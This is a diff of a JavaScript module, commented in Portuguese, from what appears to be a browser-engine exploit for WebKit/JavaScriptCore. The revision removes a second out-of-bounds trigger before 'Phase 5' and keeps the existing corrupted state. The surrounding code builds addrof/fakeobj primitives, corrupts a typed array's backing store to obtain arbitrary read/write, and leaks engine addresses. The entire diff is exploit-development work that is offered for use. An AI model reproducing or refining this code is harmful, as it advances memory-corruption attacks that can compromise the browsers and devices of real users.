@@ -1,8 +1,11 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v119 - R79 Correção de Escopo de Variáveis)
+// js/script3/testArrayBufferVictimCrash.mjs (v120 - R80 Remover Re-trigger OOB em Fase 5)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// - Ajusta o escopo das variáveis chave (leak_target_obj, leak_target_addr) para que
-//   elas sejam acessíveis por todas as fases relevantes dentro do bloco 'try'.
+// - Remover a chamada a 'triggerOOB_primitive({ force_reinit: true })' antes da Fase 5.
+// - Apenas re-inicializar as variáveis 'confused_array', 'victim_array' e re-definir
+//   as funções addrof/fakeobj para a Fase 5.
+// - Isso deve evitar que o ambiente OOB global seja resetado novamente, na esperança
+//   de manter o 'addrof_func' estável após a Fase 4.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -16,7 +19,7 @@ import {
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
 // Nome do módulo atualizado para refletir a nova tentativa de correção
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v119_R79_ScopeFix";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v120_R80_NoOOBReTrigger";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -40,7 +43,7 @@ function doubleToInt64(double) {
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Corrupção de Backing Store (Escopo Corrigido) ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação sem Re-trigger OOB na Fase 5 ---`, "test");
 
     let final_result = {
         success: false,
@@ -84,7 +87,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 
         // --- FASES 1-3: Configuração das Primitivas INICIAL (para verificação) ---
         logS3("--- FASES 1-3: Obtendo primitivas OOB e L/E (primeira vez para verificação)... ---", "subtest");
-        await triggerOOB_primitive({ force_reinit: true });
+        // O trigger OOB inicial permanece.
+        await triggerOOB_primitive({ force_reinit: true }); 
         if (!getOOBDataView()) throw new Error("Falha ao obter primitiva OOB.");
 
         setupAddrofFakeobj(); 
@@ -130,9 +134,10 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3("VERIFICAÇÃO DE L/E DA FASE 4 COMPLETA: Leitura/Escrita arbitrária é 100% funcional.", "vuln");
         await PAUSE_S3(50); 
 
-        // --- Reiniciar TODO o ambiente para a Fase 5 ---
-        logS3("--- PREPARANDO FASE 5: RE-INICIALIZANDO TODO O AMBIENTE OOB E PRIMITIVAS... ---", "critical");
+        // --- PREPARANDO FASE 5: APENAS RE-INICIALIZANDO PRIMITIVAS (SEM RE-TRIGGER OOB) ---
+        logS3("--- PREPARANDO FASE 5: APENAS RE-INICIALIZANDO PRIMITIVAS (SEM RE-TRIGGER OOB) ---", "critical");
         
+        // Zera as referências antigas para ajudar na coleta de lixo
         confused_array = null;
         victim_array = null;
         addrof_func = null;
@@ -142,14 +147,14 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 
         await PAUSE_S3(200); 
 
-        await triggerOOB_primitive({ force_reinit: true });
-        if (!getOOBDataView()) throw new Error("Falha ao re-inicializar primitiva OOB para Fase 5.");
-        logS3("Ambiente OOB re-inicializado com sucesso.", "good");
+        // REMOVIDO: await triggerOOB_primitive({ force_reinit: true });
+        // if (!getOOBDataView()) throw new Error("Falha ao re-inicializar primitiva OOB para Fase 5.");
+        logS3("Ambiente OOB existente será reutilizado. Primitivas serão re-definidas.", "good");
 
-        setupAddrofFakeobj(); // Re-cria as primitivas addrof/fakeobj no novo contexto
+        setupAddrofFakeobj(); // Re-cria as primitivas addrof/fakeobj no contexto EXISTENTE
         logS3("Primitivas Addrof/Fakeobj re-inicializadas para Fase 5.", "good");
 
-        // --- Warm-up do addrof/fakeobj (no novo ambiente) ---
+        // --- Warm-up do addrof/fakeobj (no ambiente existente) ---
         logS3("--- Warm-up: Realizando operações de Addrof/Fakeobj de teste para estabilizar... ---", "info");
         const warm_up_obj = { w: 1 };
         addrof_func(warm_up_obj); 
@@ -165,13 +170,13 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         arb_rw_array = new Uint8Array(0x1000); 
         logS3(`    arb_rw_array criado. Endereço interno será corrompido.`, "info");
 
-        // Agora, 'leak_target_obj' e 'leak_target_addr' são inicializados aqui, após o OOB re-trigger.
+        // Agora, 'leak_target_obj' e 'leak_target_addr' são inicializados aqui, após a re-inicialização das primitivas.
         leak_target_obj = { f: 0xDEADBEEF, g: 0xCAFEBABE, h: 0x11223344 }; 
         for(let i=0; i<1000; i++) { leak_target_obj[`p${i}`] = i; } 
         leak_target_addr = addrof_func(leak_target_obj); // Atribui à variável de escopo mais amplo
         logS3(`[Etapa 1] Endereço do objeto alvo (leak_target_obj): ${leak_target_addr.toString(true)}`, "info");
         
-        await PAUSE_S3(250); // Pausa após obtenção do endereço
+        await PAUSE_S3(250); 
 
         const arb_rw_array_ab_view_addr = addrof_func(arb_rw_array);
         logS3(`    Endereço do ArrayBufferView de arb_rw_array: ${arb_rw_array_ab_view_addr.toString(true)}`, "leak");
@@ -356,6 +361,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         arb_rw_array = null; 
         arb_read_stable = null;
         arb_write_stable = null;
+        leak_target_obj = null; // Limpar também
+        leak_target_addr = null; // Limpar também
         
         logS3(`[${FNAME_CURRENT_TEST_BASE}] Limpeza final de referências concluída.`, "info");
     }
